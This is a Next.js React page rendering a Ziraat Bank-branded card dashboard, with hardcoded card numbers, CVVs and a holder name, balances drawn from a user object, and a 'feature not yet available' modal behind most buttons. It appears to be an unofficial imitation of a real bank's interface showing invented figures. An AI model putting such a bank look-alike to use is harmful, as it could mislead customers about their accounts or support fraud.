"use client";

import { useState } from "react";

import {
  ArrowDownLeft,
  ArrowUpRight,
  Bell,
  Building2,
  CalendarDays,
  Check,
  ChevronDown,
  ChevronLeft,
  ChevronRight,
  CircleDollarSign,
  Copy,
  CreditCard,
  Eye,
  EyeOff,
  FileText,
  Home,
  LayoutGrid,
  Lock,
  LogOut,
  Menu,
  MoreHorizontal,
  Pencil,
  PiggyBank,
  Plus,
  RotateCcw,
  Search,
  Settings,
  ShieldCheck,
  Snowflake,
  Unlock,
  User,
  Wallet,
  X,
} from "lucide-react";

import { useRouter } from "next/navigation";
import { useAuth } from '@/app/context/AuthContext';
import { DashboardHeader } from "../components/DashboardHeader";
import { Sidebar } from "../components/Sidebar";
import { MobileNavigation } from "../components/MobileNavigation";
import { IoInformationCircleOutline } from "react-icons/io5";

/*
|--------------------------------------------------------------------------
| CARD DATA
|--------------------------------------------------------------------------
*/

const cards = [
  {
    id: 1,
    type: "Visa",
    cardName: "Ziraat Platinum",
    cardHolder: "GERALD LUIS",
    number: "4829 1047 6821 4593",
    expiry: "09/29",
    cvv: "421",
    balance: "€12,450.80",
    available: "€10,250.80",
    currency: "EUR",
    status: "Active",
    cardColor: "red",
  },

  {
    id: 2,
    type: "Mastercard",
    cardName: "Ziraat Gold",
    cardHolder: "GERALD LUIS",
    number: "5391 8820 4172 9036",
    expiry: "04/28",
    cvv: "287",
    balance: "€5,820.40",
    available: "€4,900.40",
    currency: "EUR",
    status: "Active",
    cardColor: "dark",
  },

  {
    id: 3,
    type: "Visa",
    cardName: "Ziraat Debit",
    cardHolder: "GERALD LUIS",
    number: "4218 7721 3095 6628",
    expiry: "11/30",
    cvv: "613",
    balance: "€2,340.15",
    available: "€2,340.15",
    currency: "EUR",
    status: "Frozen",
    cardColor: "blue",
  },
];

/*
|--------------------------------------------------------------------------
| RECENT CARD TRANSACTIONS
|--------------------------------------------------------------------------
*/

const recentTransactions = [
  {
    id: 1,
    merchant: "Carrefour Market",
    date: "11 Aug 2026",
    type: "Purchase",
    amount: "-€85.40",
    card: "**** 4593",
    icon: <ShoppingBagIcon />,
  },
  {
    id: 2,
    merchant: "ATM Cash Withdrawal",
    date: "10 Aug 2026",
    type: "Cash Withdrawal",
    amount: "-€200.00",
    card: "**** 4593",
    icon: <Building2 size={17} />,
  },
  {
    id: 3,
    merchant: "Netflix",
    date: "09 Aug 2026",
    type: "Subscription",
    amount: "-€15.99",
    card: "**** 9036",
    icon: <CreditCard size={17} />,
  },
  {
    id: 4,
    merchant: "Salary Payment",
    date: "08 Aug 2026",
    type: "Deposit",
    amount: "+€4,850.00",
    card: "**** 4593",
    icon: <ArrowDownLeft size={17} />,
  },
];

/*
|--------------------------------------------------------------------------
| SIMPLE SHOPPING ICON
|--------------------------------------------------------------------------
*/

function ShoppingBagIcon() {
  return <CreditCard size={17} />;
}

/*
|--------------------------------------------------------------------------
| BANK CARD COMPONENT
|--------------------------------------------------------------------------
*/

function BankCard({
  card,
  showNumber,
  onToggleNumber,
  onFreeze,
  onCopy,
  copied,
}) {
  const maskedNumber =
    `•••• •••• •••• ${card.number.slice(-4)}`;
  const [isToggled, setIsToggled] = useState(false);
  const { user } = useAuth();

  return (
    <div className="w-full">
      {/* CARD */}

      <div
        className={`
          relative
          aspect-[1.586/1]
          w-full
          overflow-hidden
          rounded-[22px]
          p-5
          text-white
          shadow-xl
          sm:p-6

          ${
            card.cardColor === "red"
              ? "bg-gradient-to-br from-[#e30613] via-[#c8000d] to-[#760009]"
              : ""
          }

          ${
            card.cardColor === "dark"
              ? "bg-gradient-to-br from-[#3f4448] via-[#202428] to-[#090b0d]"
              : ""
          }

          ${
            card.cardColor === "blue"
              ? "bg-gradient-to-br from-[#334e68] via-[#243b53] to-[#102a43]"
              : ""
          }
        `}
      >
        {/* DECORATIVE SHAPES */}

        <div
          className="
            absolute
            -right-12
            -top-12
            h-40 w-40
            rounded-full
            border-[25px]
            border-white/5
          "
        />

        <div
          className="
            absolute
            -bottom-16
            -left-12
            h-40 w-40
            rounded-full
            border-[25px]
            border-white/5
          "
        />

        {/* TOP */}

        <div
          className="
            relative z-10
            flex items-start
            justify-between
          "
        >
          <div>
            <p
              className="
                text-[9px]
                font-medium
                tracking-wider
                text-white/70
              "
            >
              DEBIT CARD
            </p>

            <p
              className="
                mt-1
                text-[13px]
                font-extrabold
                sm:text-[15px]
              "
            >
              {card.cardName}
            </p>
          </div>

          {/* VISA / MASTERCARD */}

          <div
            className="
              text-right
              text-[17px]
              font-black
              italic
              tracking-tight
            "
          >
            {card.type}
          </div>
        </div>

        {/* CHIP */}

        <div
          className="
            relative z-10
            mt-[7%]
            h-[27px]
            w-[39px]
            rounded-[6px]
            border
            border-yellow-200/50
            bg-gradient-to-br
            from-yellow-100
            via-yellow-300
            to-yellow-600
            sm:h-[33px]
            sm:w-[47px]
          "
        >
          <div
            className="
              absolute
              left-1/2
              top-1/2
              h-[1px]
              w-full
              bg-yellow-700/40
            "
          />

          <div
            className="
              absolute
              left-1/2
              top-0
              h-full
              w-[1px]
              bg-yellow-700/40
            "
          />
        </div>

        {/* CARD NUMBER */}

        <div
          className="
            relative z-10
            mt-[6%]
            text-[14px]
            font-semibold
            tracking-[2px]
            sm:text-[18px]
            sm:tracking-[3px]
          "
        >
          {showNumber ? card.number : maskedNumber}
        </div>

        {/* BOTTOM */}

        <div
          className="
            relative z-10
            mt-[4%]
            flex
            items-end
            justify-between
          "
        >
          <div>
            <p
              className="
                text-[6px]
                uppercase
                text-white/60
                sm:text-[7px]
              "
            >
              Card Holder
            </p>

            <p
              className="
                mt-1
                text-[8px]
                font-bold
                tracking-wider
                sm:text-[10px]
              "
            >
              {card.cardHolder}
            </p>
          </div>

          <div>
            <p
              className="
                text-[6px]
                uppercase
                text-white/60
                sm:text-[7px]
              "
            >
              Valid Thru
            </p>

            <p
              className="
                mt-1
                text-[8px]
                font-bold
                sm:text-[10px]
              "
            >
              {card.expiry}
            </p>
          </div>

          <div
            className="
              flex
              h-7 w-7
              items-center
              justify-center
              rounded-full
              bg-white/10
              sm:h-9 sm:w-9
            "
          >
            <CircleDollarSign size={17} />
          </div>
        </div>
      </div>

      {/* CARD CONTROLS */}

      <div
        className="
          mt-3
          flex
          items-center
          justify-between
        "
      >
        <button
          type="button"
          onClick={() => onToggleNumber(card.id)}
          className="
            flex
            items-center
            gap-1.5
            text-[9px]
            font-bold
            text-gray-500
            hover:text-[#e30613]
          "
        >
          {showNumber ? <EyeOff size={14} /> : <Eye size={14} />}

          {showNumber ? "Hide number" : "Show number"}
        </button>

        <button
          type="button"
          onClick={() => onCopy(card.number)}
          className="
            flex
            items-center
            gap-1.5
            text-[9px]
            font-bold
            text-gray-500
            hover:text-[#e30613]
          "
        >
          {copied ? <Check size={14} /> : <Copy size={14} />}

          {copied ? "Copied" : "Copy number"}
        </button>
      </div>

      {/* BALANCE */}

      <div
        className="
          mt-4
          rounded-2xl
          border
          border-gray-200
          bg-white
          p-4
        "
      >
        <div
          className="
            flex
            items-center
            justify-between
          "
        >
          <div>
            <p
              className="
                text-[9px]
                font-semibold
                text-gray-400
              "
            >
              Available balance
            </p>

            <p
              className="
                mt-1
                text-[17px]
                font-extrabold
                text-gray-900
              "
            >
              {`$${user.balance.toLocaleString()}.00`}
            </p>
          </div>

          <div className="text-right">
            <p
              className="
                text-[9px]
                font-semibold
                text-gray-400
              "
            >
              Total balance
            </p>

            <p
              className="
                mt-1
                text-[12px]
                font-bold
                text-gray-700
              "
            >
              {`$${user.balance.toLocaleString()}.00`}
            </p>
          </div>
        </div>
      </div>

      {/* ACTIONS */}

      <div
        className="
          mt-3
          grid
          grid-cols-3
          gap-2
        "
      >
        <button
          type="button"
          onClick={() => onFreeze(card.id)}
          className="
            flex
            h-9
            items-center
            justify-center
            gap-1
            rounded-xl
            border
            border-gray-200
            bg-white
            text-[9px]
            font-bold
            text-gray-600
            hover:bg-gray-50
          "
        >
          {card.status === "Frozen" ? (
            <>
              <Unlock size={13} />
              Unfreeze
            </>
          ) : (
            <>
              <Snowflake size={13} />
              Freeze
            </>
          )}
        </button>

        <button
          type="button"
          onClick={() => setIsToggled(true)}
          className="
            flex
            h-9
            items-center
            justify-center
            gap-1
            rounded-xl
            border
            border-gray-200
            bg-white
            text-[9px]
            font-bold
            text-gray-600
            hover:bg-gray-50
          "
        >
          <RotateCcw size={13} />
          Replace
        </button>

        <button
          type="button"
          onClick={() => setIsToggled(true)}
          className="
            flex
            h-9
            items-center
            justify-center
            gap-1
            rounded-xl
            border
            border-gray-200
            bg-white
            text-[9px]
            font-bold
            text-gray-600
            hover:bg-gray-50
          "
        >
          <MoreHorizontal size={14} />
          More
        </button>
      </div>

      {isToggled === true && (
        <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 justify-center bg-black/50 items-center loading-modal">
          <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 dark:bg-isoDark2 bg-white space-y-4">
            <div className="flex justify-center items-center rounded-full p-2 dark:bg-isoDark bg-[#f4f4f5]">
              <IoInformationCircleOutline className="w-16 text-black dark:text-isoColor2 h-16" />
            </div>

            <h1 className="px-6 text-lg font-medium text-center md:font-semibold">
              Notice!
            </h1>

            <p className="text-xs text-center">
              This feature is not yet available for this account. Ziraat Bank
              operating team will notify you as soon as it becomes functional.
              Thank you.
            </p>

            <button
              type="button"
              onClick={() => setIsToggled(false)}
              className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
            >
              OK
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

/*
|--------------------------------------------------------------------------
| CARD PAGE
|--------------------------------------------------------------------------
*/

function CardsContent() {
  const { user } = useAuth();
  const cards = [
    {
      id: 1,
      type: "Visa",
      cardName: "Ziraat Platinum",
      cardHolder: user.fullname,
      number: "4829 1047 6821 4593",
      expiry: "09/29",
      cvv: "421",
      balance: "€12,450.80",
      available: "€10,250.80",
      currency: "EUR",
      status: "Active",
      cardColor: "red",
    },

    // {
    //   id: 2,
    //   type: "Mastercard",
    //   cardName: "Ziraat Gold",
    //   cardHolder: "GERALD LUIS",
    //   number: "5391 8820 4172 9036",
    //   expiry: "04/28",
    //   cvv: "287",
    //   balance: "€5,820.40",
    //   available: "€4,900.40",
    //   currency: "EUR",
    //   status: "Active",
    //   cardColor: "dark",
    // },

    // {
    //   id: 3,
    //   type: "Visa",
    //   cardName: "Ziraat Debit",
    //   cardHolder: "GERALD LUIS",
    //   number: "4218 7721 3095 6628",
    //   expiry: "11/30",
    //   cvv: "613",
    //   balance: "€2,340.15",
    //   available: "€2,340.15",
    //   currency: "EUR",
    //   status: "Frozen",
    //   cardColor: "blue",
    // },
  ];

  const [isToggled, setIsToggled] = useState(false);
  const [showNumbers, setShowNumbers] =
    useState({});

  const [copied, setCopied] =
    useState(null);

  const [cardList, setCardList] =
    useState(cards);

  /*
  |--------------------------------------------------------------------------
  | SHOW / HIDE
  |--------------------------------------------------------------------------
  */

  const toggleNumber = (id) => {

    setShowNumbers((previous) => ({
      ...previous,
      [id]: !previous[id],
    }));

  };

  /*
  |--------------------------------------------------------------------------
  | COPY CARD NUMBER
  |--------------------------------------------------------------------------
  */

  const copyCardNumber = async (
    number
  ) => {

    try {
      await navigator.clipboard.writeText(
        number
      );

      setCopied(number);

      setTimeout(() => {
        setCopied(null);
      }, 1800);

    } catch (error) {
      console.error(
        "Unable to copy card number:",
        error
      );
    }

  };

  /*
  |--------------------------------------------------------------------------
  | FREEZE / UNFREEZE
  |--------------------------------------------------------------------------
  */

  const toggleFreeze = (id) => {

    setCardList((previous) =>
      previous.map((card) =>
        card.id === id
          ? {
              ...card,
              status:
                card.status === "Frozen"
                  ? "Active"
                  : "Frozen",
            }
          : card
      )
    );

  };

  return (
    <div className="w-full">
      {/* PAGE HEADER */}

      <div
        className="
          mb-6
          flex
          flex-col
          gap-4
          sm:flex-row
          sm:items-end
          sm:justify-between
        "
      >
        <div>
          <div
            className="
              mb-2
              flex
              items-center
              gap-2
              text-[10px]
              font-semibold
              text-gray-400
            "
          >
            <span>Dashboard</span>

            <ChevronRight size={13} />

            <span className="text-gray-600">My Cards</span>
          </div>

          <h1
            className="
              text-[23px]
              font-extrabold
              text-gray-900
              sm:text-[27px]
            "
          >
            My Bank Cards
          </h1>

          <p
            className="
              mt-1
              text-[11px]
              leading-relaxed
              text-gray-500
              sm:text-[12px]
            "
          >
            Manage your debit and ATM cards, view balances and control card
            security.
          </p>
        </div>

        <button
          type="button"
          onClick={() => setIsToggled(true)}
          className="
            flex
            h-10
            w-fit
            items-center
            gap-2
            rounded-full
            bg-[#e30613]
            px-4
            text-[10px]
            font-extrabold
            text-white
            shadow-sm
            hover:bg-[#c90510]
          "
        >
          <Plus size={15} />
          Add New Card
        </button>
      </div>

      {/* TOP SUMMARY */}

      <div
        className="
          mb-6
          grid
          grid-cols-1
          gap-3
          sm:grid-cols-2
          xl:grid-cols-4
        "
      >
        {/* ACTIVE CARDS */}

        <div
          className="
            rounded-2xl
            border
            border-gray-200
            bg-white
            p-4
          "
        >
          <div
            className="
              flex
              items-center
              gap-3
            "
          >
            <div
              className="
                flex
                h-10 w-10
                items-center
                justify-center
                rounded-xl
                bg-red-50
                text-[#e30613]
              "
            >
              <CreditCard size={19} />
            </div>

            <div>
              <p
                className="
                  text-[9px]
                  font-semibold
                  text-gray-400
                "
              >
                Total cards
              </p>

              <p
                className="
                  mt-1
                  text-[18px]
                  font-extrabold
                "
              >
                {cardList.length}
              </p>
            </div>
          </div>
        </div>

        {/* ACTIVE */}

        <div
          className="
            rounded-2xl
            border
            border-gray-200
            bg-white
            p-4
          "
        >
          <div
            className="
              flex
              items-center
              gap-3
            "
          >
            <div
              className="
                flex
                h-10 w-10
                items-center
                justify-center
                rounded-xl
                bg-green-50
                text-green-600
              "
            >
              <ShieldCheck size={19} />
            </div>

            <div>
              <p
                className="
                  text-[9px]
                  font-semibold
                  text-gray-400
                "
              >
                Active cards
              </p>

              <p
                className="
                  mt-1
                  text-[18px]
                  font-extrabold
                "
              >
                {cardList.filter((card) => card.status === "Active").length}
              </p>
            </div>
          </div>
        </div>

        {/* TOTAL BALANCE */}

        <div
          className="
            rounded-2xl
            border
            border-gray-200
            bg-white
            p-4
          "
        >
          <div
            className="
              flex
              items-center
              gap-3
            "
          >
            <div
              className="
                flex
                h-10 w-10
                items-center
                justify-center
                rounded-xl
                bg-blue-50
                text-blue-600
              "
            >
              <CircleDollarSign size={19} />
            </div>

            <div>
              <p
                className="
                  text-[9px]
                  font-semibold
                  text-gray-400
                "
              >
                Card balance
              </p>

              <p
                className="
                  mt-1
                  text-[18px]
                  font-extrabold
                "
              >
                {`$${user.balance.toLocaleString()}.00`}
              </p>
            </div>
          </div>
        </div>

        {/* SECURITY */}

        <div
          className="
            rounded-2xl
            border
            border-gray-200
            bg-white
            p-4
          "
        >
          <div
            className="
              flex
              items-center
              gap-3
            "
          >
            <div
              className="
                flex
                h-10 w-10
                items-center
                justify-center
                rounded-xl
                bg-purple-50
                text-purple-600
              "
            >
              <Lock size={18} />
            </div>

            <div>
              <p
                className="
                  text-[9px]
                  font-semibold
                  text-gray-400
                "
              >
                Security
              </p>

              <p
                className="
                  mt-1
                  text-[12px]
                  font-extrabold
                  text-green-600
                "
              >
                Protected
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* CARDS + SIDEBAR */}

      <div
        className="
          grid
          grid-cols-1
          gap-6
          xl:grid-cols-[minmax(0,1fr)_330px]
        "
      >
        {/* ATM CARDS */}

        <section>
          <div
            className="
              mb-4
              flex
              items-center
              justify-between
            "
          >
            <div>
              <h2
                className="
                  text-[14px]
                  font-extrabold
                  text-gray-800
                "
              >
                Your ATM Cards
              </h2>

              <p
                className="
                  mt-1
                  text-[10px]
                  text-gray-400
                "
              >
                Select a card to manage its settings.
              </p>
            </div>

            <button
              type="button"
              className="
                hidden
                items-center
                gap-1
                text-[9px]
                font-bold
                text-[#e30613]
                sm:flex
              "
            >
              View all
              <ChevronRight size={13} />
            </button>
          </div>

          <div
            className="
              grid
              grid-cols-1
              gap-5
              md:grid-cols-2
            "
          >
            {cardList.map((card) => (
              <BankCard
                key={card.id}
                card={card}
                showNumber={!!showNumbers[card.id]}
                onToggleNumber={toggleNumber}
                onFreeze={toggleFreeze}
                onCopy={copyCardNumber}
                copied={copied === card.number}
              />
            ))}

            {/* ADD CARD */}

            <button
              type="button"
              onClick={() => setIsToggled(true)}
              className="
                group
                flex
                aspect-[1.586/1]
                w-full
                flex-col
                items-center
                justify-center
                rounded-[22px]
                border-2
                border-dashed
                border-gray-200
                bg-white
                text-gray-400
                transition
                hover:border-[#e30613]
                hover:bg-red-50/30
              "
            >
              <span
                className="
                  flex
                  h-12 w-12
                  items-center
                  justify-center
                  rounded-full
                  bg-gray-100
                  transition
                  group-hover:bg-red-100
                  group-hover:text-[#e30613]
                "
              >
                <Plus size={21} />
              </span>

              <span
                className="
                  mt-3
                  text-[11px]
                  font-extrabold
                  text-gray-600
                  group-hover:text-[#e30613]
                "
              >
                Add another ATM card
              </span>

              <span
                className="
                  mt-1
                  text-[9px]
                  text-gray-400
                "
              >
                Request a new bank card
              </span>
            </button>
          </div>
        </section>

        {/* RIGHT SIDEBAR */}

        <aside>
          {/* QUICK ACTIONS */}

          <div
            className="
              rounded-[20px]
              border
              border-gray-200
              bg-white
              p-5
            "
          >
            <h3
              className="
                text-[13px]
                font-extrabold
                text-gray-800
              "
            >
              Card Services
            </h3>

            <p
              className="
                mt-1
                text-[9px]
                text-gray-400
              "
            >
              Manage your ATM cards
            </p>

            <div
              className="
                mt-4
                space-y-2
              "
            >
              <CardAction
                icon={<Snowflake size={17} />}
                title="Freeze Card"
                description="Temporarily block a card"
              />

              <CardAction
                icon={<RotateCcw size={17} />}
                title="Replace Card"
                description="Request a replacement"
              />

              <CardAction
                icon={<Lock size={17} />}
                title="Change PIN"
                description="Update your card PIN"
              />

              <CardAction
                icon={<ShieldCheck size={17} />}
                title="Card Security"
                description="Review security settings"
              />
            </div>
          </div>

          {/* ATM FINDER */}

          <div
            className="
              mt-5
              overflow-hidden
              rounded-[20px]
              bg-gradient-to-br
              from-[#e30613]
              to-[#a9000a]
              p-5
              text-white
            "
          >
            <div
              className="
                flex
                h-10 w-10
                items-center
                justify-center
                rounded-xl
                bg-white/15
              "
            >
              <Building2 size={20} />
            </div>

            <h3
              className="
                mt-4
                text-[14px]
                font-extrabold
              "
            >
              Find an ATM
            </h3>

            <p
              className="
                mt-1
                text-[9px]
                leading-relaxed
                text-white/70
              "
            >
              Find the nearest ATM or branch and get directions.
            </p>

            <a
              href="/"
              className="
                mt-4
                flex
                h-9
                w-full
                items-center
                justify-center
                gap-2
                rounded-full
                bg-white
                text-[9px]
                font-extrabold
                text-[#e30613]
              "
            >
              Find an ATM
              <ChevronRight size={14} />
            </a>
          </div>
        </aside>
      </div>

      {isToggled === true && (
        <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 justify-center bg-black/50 items-center loading-modal">
          <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 dark:bg-isoDark2 bg-white space-y-4">
            <div className="flex justify-center items-center rounded-full p-2 dark:bg-isoDark bg-[#f4f4f5]">
              <IoInformationCircleOutline className="w-16 text-black dark:text-isoColor2 h-16" />
            </div>

            <h1 className="px-6 text-lg font-medium text-center md:font-semibold">
              Notice!
            </h1>

            <p className="text-xs text-center">
              This feature is not yet available for this account. Ziraat Bank
              operating team will notify you as soon as it becomes functional.
              Thank you.
            </p>

            <button
              type="button"
              onClick={() => setIsToggled(false)}
              className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
            >
              OK
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

/*
|--------------------------------------------------------------------------
| CARD ACTION
|--------------------------------------------------------------------------
*/

function CardAction({
  icon,
  title,
  description,
}) {
  return (
    <button
      type="button"
      className="
        flex
        w-full
        items-center
        gap-3
        rounded-xl
        p-2.5
        text-left
        transition
        hover:bg-gray-50
      "
    >

      <span
        className="
          flex
          h-9 w-9
          shrink-0
          items-center
          justify-center
          rounded-xl
          bg-gray-100
          text-gray-600
        "
      >
        {icon}
      </span>

      <span className="min-w-0">

        <span
          className="
            block
            text-[10px]
            font-extrabold
            text-gray-700
          "
        >
          {title}
        </span>

        <span
          className="
            mt-0.5
            block
            truncate
            text-[8px]
            text-gray-400
          "
        >
          {description}
        </span>

      </span>

      <ChevronRight
        size={14}
        className="
          ml-auto
          shrink-0
          text-gray-300
        "
      />

    </button>
  );
}

/*
|--------------------------------------------------------------------------
| PAGE
|--------------------------------------------------------------------------
*/

export default function CardsPage() {

  const [isToggled, setIsToggled] = useState(false);
  const [sidebarOpen, setSidebarOpen] =
    useState(false);

  return (
    <main
      className="
        min-h-screen
        bg-[#f5f6f7]
        text-gray-900
      "
    >

      {/* HEADER */}

      <DashboardHeader
        sidebarOpen={sidebarOpen}
        setSidebarOpen={setSidebarOpen}
      />

      <div
        className="
          mx-auto
          flex
          w-full
          max-w-[1500px]
        "
      >

        {/* ORIGINAL SIDEBAR */}

        <Sidebar
        tab={'cards'}
          open={sidebarOpen}
          setOpen={setSidebarOpen}
        />

        {/* MAIN CONTENT */}

        <div
          className="
            min-w-0
            flex-1
            pb-[85px]
            lg:pb-8
          "
        >

          <div
            className="
              mx-auto
              w-full
              max-w-[1250px]
              px-4
              py-5
              sm:px-6
              sm:py-7
              lg:px-8
              lg:py-8
            "
          >

            <CardsContent />

          </div>

        </div>

      </div>

      {/* MOBILE BOTTOM NAV */}

      <MobileNavigation tab={'cards'} />

    </main>
  );
}